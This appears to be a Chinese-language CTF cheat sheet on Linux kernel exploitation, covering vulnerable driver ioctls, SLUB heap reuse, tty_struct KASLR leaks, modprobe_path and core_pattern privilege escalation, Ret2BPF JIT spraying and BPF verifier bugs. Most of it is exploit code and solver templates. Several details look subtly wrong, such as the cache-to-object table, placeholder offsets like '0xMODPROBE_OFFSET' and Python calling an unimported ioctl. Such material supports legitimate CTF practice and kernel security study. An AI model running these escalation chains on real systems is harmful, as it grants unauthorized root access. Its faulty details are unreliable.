---
title: "CTF Pwn - Linux Kernel Exploitation"
categories:
  - pwn
topics:
  - "kernel pwn"
  - "LKM"
  - "UAF"
  - "tty_struct"
  - "BPF JIT"
signals:
  - "kernel"
  - "LKM"
  - "ko"
  - "tty_struct"
  - "BPF"
  - "modprobe_path"
  - "/dev/"
load_when: "Pwn 题涉及 Linux kernel、驱动模块、/dev 设备、BPF 或内核 UAF。"
---
# CTF Pwn — Linux Kernel Exploitation

> **适用版本**: Linux 5.x/6.x, QEMU, gcc, busybox
> **最后更新**: 2026-05-26
> **覆盖**: LKM 分析, 内核堆 UAF, tty_struct, modprobe_path, Ret2BPF, 交叉缓存
> **参考**: how2keap, google/security-research, n1CTF 2025, UIUCTF 2025

---

## Table of Contents
- [环境搭建与调试](#环境搭建与调试)
- [LKM 分析基础](#lkm-分析基础)
  - [ioctl 接口审计](#ioctl-接口审计)
  - [procfs 接口](#procfs-接口)
- [内核堆基础 (SLUB)](#内核堆基础-slub)
  - [kmalloc 与可回收对象](#kmalloc-与可回收对象)
  - [SLUB 分配结构速查](#slub-分配结构速查)
- [内核利用核心技术](#内核利用核心技术)
  - [tty_struct — KASLR 泄露 + ioctl 劫持](#tty_struct--kaslr-泄露--ioctl-劫持)
  - [modprobe_path — 经典提权](#modprobe_path--经典提权)
  - [core_pattern — 替代 modprobe_path](#core_pattern--替代-modprobe_path)
  - [pipe_buffer — UAF 原语](#pipe_buffer--uaf-原语)
  - [msg_msg — 跨缓存 IPC 原语](#msg_msg--跨缓存-ipc-原语)
- [Ret2BPF — 无泄露利用 (n1CTF 2025)](#ret2bpf--无泄露利用-n1ctf-2025)
- [交叉缓存攻击 (Cross-Cache)](#交叉缓存攻击-cross-cache)
- [BPF Verifier 漏洞利用](#bpf-verifier-漏洞利用)
- [Solver 模板](#solver-模板)

---

## 环境搭建与调试

### 最小内核启动环境

```bash
# 1. 获取内核
apt-get install linux-image-$(uname -r) linux-headers-$(uname -r)

# 2. 创建 initramfs（busybox + exploit）
mkdir -p initramfs/{bin,sbin,etc,proc,sys,dev,tmp,root}
cd initramfs/bin
wget https://busybox.net/downloads/binaries/latest/busybox-x86_64
chmod +x busybox-x86_64
# 创建 symlinks
for applet in sh cat ls mount insmod; do ln -s busybox-x86_64 $applet; done
cd ..

# 3. init 脚本
cat > init << 'EOF'
#!/bin/sh
mount -t proc none /proc
mount -t sysfs none /sys
mount -t devtmpfs none /dev
echo 1 > /proc/sys/kernel/kptr_restrict  # 全局符号指针限制
echo 1 > /proc/sys/kernel/dmesg_restrict
insmod /chall.ko  # 加载漏洞模块
chmod 666 /dev/chall
cat /flag 2>/dev/null
setsid cttyhack /bin/sh
poweroff -f
EOF
chmod +x init
find . | cpio -H newc -o > ../initramfs.cpio
gzip -f ../initramfs.cpio

# 4. QEMU 启动脚本
cat > run.sh << 'EOF'
qemu-system-x86_64 -kernel /boot/vmlinuz-$(uname -r) \
  -initrd initramfs.cpio.gz \
  -append "console=ttyS0 root=/dev/ram oops=panic panic=1" \
  -nographic -monitor none \
  -m 256M -smp 1 \
  -s  # GDB 端口 1234
EOF
```

### GDB 调试

```bash
# QEMU + GDB (需内核 vmlinux + ko)
gdb -ex "target remote localhost:1234" \
    -ex "add-symbol-file chall.ko 0x$(cat /sys/module/chall/sections/.text)" \
    -ex "b challenge_ioctl" \
    vmlinux

# 在 QEMU 中获取 .text 地址
cat /sys/module/chall/sections/.text
```

### 内核保护检测

```bash
# 从 /proc/config.gz 或 /dev/shm 获取内核配置
zcat /proc/config.gz 2>/dev/null || cat /boot/config-$(uname -r)

# 关键保护：
# CONFIG_SLAB_FREELIST_RANDOM=y      → freelist 随机化
# CONFIG_SLAB_FREELIST_HARDENED=y    → freelist 指针加密
# CONFIG_RANDOM_KMALLOC_CACHES=y     → kmalloc 缓存随机化（6.x 新增）
# CONFIG_SLAB_BUCKETS=y              → 分离缓存（Ubuntu 24.04+）
# CONFIG_MITIGATION_RETPOLINE=y      → retpoline（限制 ROP）
# CONFIG_KASAN=y                     → KASAN KernelAddressSANitizer
# CONFIG_HARDENED_USERCOPY=y         → usercopy 加固
# CONFIG_STATIC_USERMODEHELPER=y     → 禁用 modprobe_path 写入
```

---

## LKM 分析基础

### ioctl 接口审计

```c
// 内核模块典型 ioctl 实现
static long device_ioctl(struct file *file, unsigned int cmd, unsigned long arg) {
    struct chall_buf *buf = (struct chall_buf *)arg;

    switch (cmd) {
        case 0x1337:  // ALLOC: 分配内核对象
            kmalloc(size, GFP_KERNEL);
            break;
        case 0x1338:  // FREE: 释放 (UAF 常在此处)
            kfree(ptr);
            // BUG: 未将 ptr 置 NULL → 悬空指针
            break;
        case 0x1339:  // EDIT: 写入
            copy_from_user(ptr, buf->data, buf->size);
            break;
        case 0x1340:  // SHOW: 读取
            copy_to_user(buf->data, ptr, buf->size);
            break;
    }
    return 0;
}
```

**漏洞模式速查**:

| 模式 | ioctl 特征 | 利用原语 |
|------|-----------|---------|
| UAF (悬空指针) | FREE 后未 NULL → 可再次 SHOW/EDIT | 对象回收 + 伪造 ops |
| OOB (越界) | EDIT 未检查 size > 分配 size | 覆盖相邻对象 |
| Double Fetch | 多次 copy_from_user 同一地址 | TOCTOU 竞态 |
| Integer Overflow | size 计算为 0 → kmalloc 过小 | 堆溢出 |
| Init/Memset 遗漏 | 分配后未 zero → 信息泄露 | KASLR 泄露 |

### procfs 接口

```c
// procfs write handler 中的漏洞
static ssize_t proc_write(struct file *file, const char __user *buf,
                          size_t len, loff_t *off) {
    char data[64];
    if (copy_from_user(data, buf, len))  // BUG: len > 64 → 栈溢出
        return -EFAULT;
    // ...
}
```

---

## 内核堆基础 (SLUB)

### kmalloc 与可回收对象

| kmalloc 缓存 | 常用可回收对象 |
|-------------|--------------|
| kmalloc-16 | cred_jar (cred 结构体) |
| kmalloc-32 | 文件描述符、msg_msg 头 |
| kmalloc-64 | timer_list、io_kiocb |
| kmalloc-128 | epitem、tty_struct |
| kmalloc-192 | raw_spinlock、seq_file |
| kmalloc-256 | pipe_buffer、pgv 数组 |
| kmalloc-512 | bpf_array、信标消息 |
| kmalloc-1024 | 大 msg_msg、sigqueue |

### SLUB 分配结构速查

```
kmem_cache_cpu → 当前 CPU 的 freelist（无锁分配）
    ↓ 耗尽
kmem_cache_node → 部分空闲 slab（需锁）
    ↓ 耗尽
Buddy Allocator → 分配新 slab 页（2^order 连续页）
```

**freelist 指针**:
- Linux 6.2+: `freelist_ptr(pos, ptr, offset) = ptr ^ pos >> 8` (SAFE_HARDENED)
- 绕过: 需要泄露 heap 地址来计算 XOR key

---

## 内核利用核心技术

### tty_struct — KASLR 泄露 + ioctl 劫持

利用 `tty_struct`（kmalloc-128）回收被释放的内核对象——最经典稳定。

**步骤**:
1. 触发 UAF 释放目标对象（kmalloc-128）
2. `open("/dev/ptmx")` — 分配 `tty_struct` 到同一位置
3. 读取对象（SHOW）→ 从 `tty_struct.ops` 指针获得 KASLR 基址
4. 伪造 `tty_struct.ops` 指向用户空间构造的 fake table
5. `ioctl(tty_fd, ...)` → 跳转到用户控制函数

```c
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>

struct tty_operations {
    int  (*lookup)(void);      // offset 0
    int  (*install)(void);     // offset 8
    int  (*open)(void);        // offset 16
    int  (*close)(void);       // offset 24
    void (*write)(void);       // offset 32
    // ... 后续为 ioctl 等
};

int main() {
    int target_fd = open("/dev/chall", O_RDWR);  // UAF 模块

    // Step 1: 触发 FREE → 对象进入 freelist
    ioctl(target_fd, FREE_CMD, 0);

    // Step 2: 回收 → tty_struct
    int tty_fd = open("/dev/ptmx", O_RDWR | O_NOCTTY);

    // Step 3: 泄露 → 读 ops 指针
    struct tty_struct_leak {
        int magic;          // 0x5401
        int count;
        struct tty_operations *ops;  // KASLR 关键
    } data;
    ioctl(target_fd, SHOW_CMD, &data);
    unsigned long ops_addr = (unsigned long)data.ops;
    unsigned long kernel_base = ops_addr - OPS_OFFSET;  // 需根据内核版本调整

    printf("kernel base: 0x%lx\n", kernel_base);

    // Step 4: 伪造 ops → 实现提权
    // (继续到 modprobe_path 或 commit_creds)
}
```

### modprobe_path — 经典提权

**原理**: 当内核尝试执行未知二进制格式时，调用 `modprobe_path`（默认为 `/sbin/modprobe`）。将其覆盖为自定义脚本路径 → 以 root 执行。

**条件**: `CONFIG_STATIC_USERMODEHELPER=n`（默认开启后禁用此路径）。

```python
# exploit 流程
# 1. 获得内核任意写（AAR/AAW 原语）
# 2. 确定 modprobe_path 地址（/proc/kallsyms 或 KASLR 计算）
# 3. 写入自定义脚本路径到 modprobe_path
# 4. 创建文件头为非法魔法的文件
# 5. 执行该文件 → 内核触发 modprobe_path → root shell

from pwn import *
import struct

# 假设已获得内核基址
KERNEL_BASE = 0xffffffff81000000
MODPROBE_PATH = KERNEL_BASE + 0xMODPROBE_OFFSET  # 需根据版本查 /proc/kallsyms

def arbitrary_write(addr, data):
    # 利用 AAR/AAW 原语写入
    pass

# 创建提权脚本
script = b"#!/bin/sh\ncp /flag /tmp/flag; chmod 777 /tmp/flag\n"

# 在用户空间创建文件
with open("/tmp/pwn", "wb") as f:
    f.write(script)
os.chmod("/tmp/pwn", 0o777)

# 覆盖 modprobe_path
arbitrary_write(MODPROBE_PATH, b"/tmp/pwn\x00")

# 触发：创建非法二进制文件
with open("/tmp/bad", "wb") as f:
    f.write(b"\xff\xff\xff\xff")  # 非法魔数
os.chmod("/tmp/bad", 0o777)

# 执行
subprocess.run(["/tmp/bad"])
# → modprobe_path="/tmp/pwn" 以 root 执行
# → /flag 被复制到 /tmp/flag
print(open("/tmp/flag").read())
```

**6.12+ 内核替代**: `modprobe_path` 不再因非法二进制触发（或需特定条件）。替代使用 `socket(AF_INET, SOCK_STREAM, 132)` 触发内核模块自动加载：

```c
int sock = socket(AF_INET, SOCK_STREAM, 132);  // 强制内核调用 modprobe
```

### core_pattern — 替代 modprobe_path

当 `modprobe_path` 不可用（`CONFIG_STATIC_USERMODEHELPER=y`），尝试 `core_pattern`：

```python
# 覆盖 /proc/sys/kernel/core_pattern 为脚本路径
CORE_PATTERN = 0xffffffff824xxxxx  # /proc/kallsyms 查

arbitrary_write(CORE_PATTERN, b"|/tmp/core_helper\x00")

# 创建 helper 脚本
with open("/tmp/core_helper", "wb") as f:
    f.write(b"#!/bin/sh\ncp /flag /tmp/flag\n")
os.chmod("/tmp/core_helper", 0o777)

# 触发 crash
os.kill(os.getpid(), 11)  # SIGSEGV
```

### pipe_buffer — UAF 原语

`pipe_buffer`（kmalloc-256）常用于 UAF 回收和文件描述符劫持：

```c
#include <fcntl.h>

// 创建 pipe — 分配 pipe_buffer
int p[2];
pipe(p);

// pipe_buffer 结构：
// struct pipe_buffer {
//     struct page *page;   // offset 0 — 页指针
//     unsigned int offset;
//     unsigned int len;
//     const struct pipe_buf_operations *ops;  // offset 24
//     unsigned int flags;
// };

// 利用：释放对象后分配 pipe_buffer 到同一位置
// → 修改 page 指针实现任意物理页读写
// → 修改 ops 指针劫持 close/write 等回调
```

### msg_msg — 跨缓存 IPC 原语

```c
#include <sys/msg.h>

// 创建消息队列
int msqid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);

// 发送消息 — 分配 msg_msg（kmalloc 根据 size 选择缓存）
struct msg_buf {
    long mtype;
    char mtext[MSG_SIZE];  // 控制分配 kmalloc 缓存
};
// msg_msg 头 48 字节，之后是 mtext 内容
// 发送大小: 48 + MSG_SIZE → kmalloc 64..1024

// 接收消息 — 释放 msg_msg
msgrcv(msqid, &buf, MSG_SIZE, 0, IPC_NOWAIT);

// 利用模式：
// UAF 释放 → msg_msg 回收 → 控制 mtext 伪造数据
// 读已释放对象 → msgrcv 会拷贝数据到用户空间 = 信息泄露
```

---

## Ret2BPF — 无泄露利用 (n1CTF 2025)

**核心思路**: 无需 KASLR 泄露，利用 cBPF JIT 区域在可预测地址喷射 shellcode，然后通过 reclaim 将 vtable/ops 指向 JIT 区域。

**适用场景**: UAF + vtable 劫持，但无信息泄露原语。

### 技术原理

1. cBPF JIT 编译后的代码位于 `0xffffffffc1000000 - 0x800` 附近的固定地址（取决于内核配置）
2. 通过 `setsockopt(SOL_SOCKET, SO_ATTACH_FILTER)` 加载大量 cBPF 程序
3. BPF JIT 代码中包含可以跳转到的 gadget：
   - `BPF_LD | BPF_IMM` → 将 32 位立即数载入寄存器（可作为指定地址计算基值）
   - 巧妙构造 BPF 指令序列，使最终 JIT 代码组成 `shellcode`

```c
// cBPF JIT 喷射 — n1CTF 2025 khash exploit
#define BPF_JIT_REGION 0xffffffffc1000000ULL  // 典型地址
#define NUM_PROGS 80

struct sock_filter prog[] = {
    // 每条 BPF 指令在 JIT 后产生 ~8-16 字节 x86_64 代码
    // 通过精心选择 BPF 常量和操作码，在 JIT 区域构建 shellcode
    BPF_STMT(BPF_LD | BPF_IMM, 0xdeadbeef),  // → mov eax, 0xdeadbeef
    BPF_STMT(BPF_RET | BPF_K, 0),             // → ret
};

int main() {
    int socks[NUM_PROGS];

    // 喷射 cBPF JIT
    for (int i = 0; i < NUM_PROGS; i++) {
        socks[i] = socket(AF_INET, SOCK_STREAM, 0);
        struct sock_fprog fprog = { .len = ARRAY_SIZE(prog), .filter = prog };
        setsockopt(socks[i], SOL_SOCKET, SO_ATTACH_FILTER, &fprog, sizeof(fprog));
    }

    // UAF 回收 → 将伪造 ops 指向 JIT 区域
    // 当内核通过 ops 调用函数时，实际执行 JIT 中的 gadget
    unsigned long jit_addr = BPF_JIT_REGION - 0x800;  // 需细微修正

    // 触发 vtable 调用 → 进入 shellcode
    // shellcode 覆盖 modprobe_path → root

    // n1CTF 完整解法: UAF reclaim → set vtable to JIT area
    // → shellcode: mov rdi, MODPROBE_PATH_ADDR; mov rsi, "/tmp/x"; ...
}
```

### 检测 BPF JIT 可用性

```bash
# JIT 是否启用
cat /proc/sys/net/core/bpf_jit_enable
# 0 = 禁用，1 = 启用，2 = 启用+调试输出

# JIT 区域地址（需 root）
dmesg | grep "BPF JIT"
```

### 限制

- Linux 6.8+ 限制 JIT 区域随机化范围
- `CONFIG_BPF_JIT=y` + `CONFIG_BPF_JIT_ALWAYS_ON=y`（默认）
- 需要大量 socket FD（ulimit 限制）

---

## 交叉缓存攻击 (Cross-Cache)

**背景**: `CONFIG_SLAB_BUCKETS` 和 `CONFIG_RANDOM_KMALLOC_CACHES` 将用户可控数据分离到随机缓存，传统同一缓存内回收不再可靠。

**原理**: 漏洞对象在 `kmalloc-A` 中，用 `kmalloc-B` 的内核对象来回收。

```c
// 示例: UAF 在 kmalloc-128 (tty_struct 也在 kmalloc-128)
// 但 CONFIG_RANDOM_KMALLOC_CACHES 导致随机缓存选择
// → 使用跨缓存 + 物理页 spray

// Step 1: spray 大量用户页（MADV_NOHUGEPAGE）
#define SPRAY_SIZE 0x1000
void *spray = mmap(NULL, SPRAY_SIZE * 4096, PROT_READ|PROT_WRITE,
                   MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
for (int i = 0; i < SPRAY_SIZE; i++)
    spray[i * 4096] = 'A';  // 触发物理页分配

// Step 2: 通过 page cache 假释放 + 重新分配
// 或利用 io_uring 提供的 buffer 回收
```

**SLUBStick 技术** (how2keap):
- 利用 slab 分配器中 CPU 本地 freelist 的竞态窗口
- 结合 `userfaultfd` 或 `FUSE` 精确控制触发时机
- 成功率显著高于随机 spray

---

## BPF Verifier 漏洞利用

内核 eBPF 子系统是 CTF kernel pwn 的热门题源。

### 经典漏洞模式

| 模式 | 说明 | 标志性 CVE |
|------|------|-----------|
| Verifier 类型混淆 | verifier 认为变量为 CONST_IMM，运行时实际为可写 | CVE-2025-40364 |
| 算术越界 | `ALU64` 操作后 verifier 精度推断错误 | CVE-2024-26585 |
| map_freeze bypass | freeze 后 map 实际未写保护 | 多个 2025 CTF |
| ptr_arith overflow | 指针算术导致越界访问 map 数据 | CVE-2023-2163 |

### BPF + 内核提权通用模板

```c
// 1. 创建 BPF map (array map)
// 2. 利用 verifier bug 获得越界读写
// 3. 读取内核 vmlinux 地址
// 4. 覆盖 modprobe_path 或 cred 结构体

struct bpf_insn prog[] = {
    // 加载 map fd 到 r1
    BPF_MOV64_IMM(BPF_REG_1, 0),
    // 读取 map[0] 获得内核地址
    BPF_LDX_MEM(BPF_DW, BPF_REG_0, BPF_REG_1, 0),
    // ... verifier bypass 部分 ...
    BPF_EXIT_INSN(),
};
```

---

## Solver 模板

```python
#!/usr/bin/env python3
"""
kernel exploit template
用法: python3 exploit.py
"""
from pwn import *
import struct, os, sys

# ===== 设备操作 =====
def alloc(fd, idx, size):
    ioctl(fd, 0x1337, struct.pack("II", idx, size))

def free(fd, idx):
    ioctl(fd, 0x1338, struct.pack("I", idx))

def edit(fd, idx, data):
    ioctl(fd, 0x1339, struct.pack("I", idx) + data)

def show(fd, idx):
    data = ioctl(fd, 0x1340, struct.pack("I", idx))
    return data

# ===== KASLR 泄露 (tty_struct) =====
def leak_kaslr(fd):
    alloc(fd, 0, 128)
    free(fd, 0)
    tty_fd = os.open("/dev/ptmx", os.O_RDWR | os.O_NOCTTY)
    data = show(fd, 0)
    ops_addr = u64(data[8:16])
    # ops_addr - known_offset = kernel_base
    return ops_addr

# ===== modprobe_path 提权 =====
def commit_modprobe(kernel_base, arb_write):
    modprobe_path = kernel_base + 0xMODPROBE_OFFSET
    script = b"#!/bin/sh\nchmod 777 /flag\n"
    with open("/tmp/pwn", "wb") as f:
        f.write(script)
    os.chmod("/tmp/pwn", 0o777)
    arb_write(modprobe_path, b"/tmp/pwn\x00")
    with open("/tmp/bad", "wb") as f:
        f.write(b"\xff\xff\xff\xff")
    os.chmod("/tmp/bad", 0o777)
    os.execve("/tmp/bad", ["/tmp/bad"], {})

# ===== 主逻辑 =====
def exploit():
    fd = os.open("/dev/chall", os.O_RDWR)
    ops_addr = leak_kaslr(fd)
    print(f"tty_operations: {hex(ops_addr)}")
    # ... continue ...

if __name__ == "__main__":
    exploit()
```

---

## References

- [how2keap](https://github.com/gfelber/how2keap) — Linux kernel heap exploitation cheat sheet
- [google/security-research](https://deepwiki.com/google/security-research/5.2-kernelctf-exploits) — kernelCTF exploits (CVE-2024-26585, CVE-2025-40364)
- UIUCTF 2025 "Baby Kernel" — tty_struct UAF + modprobe_path
- n1CTF 2025 "khash" — Ret2BPF, no-leak kernel exploitation
- [kernelCTF](https://google.github.io/security-research/) — Google's kernel exploit challenge platform
- [slub](https://docs.kernel.org/mm/slub.html) — SLUB allocator documentation
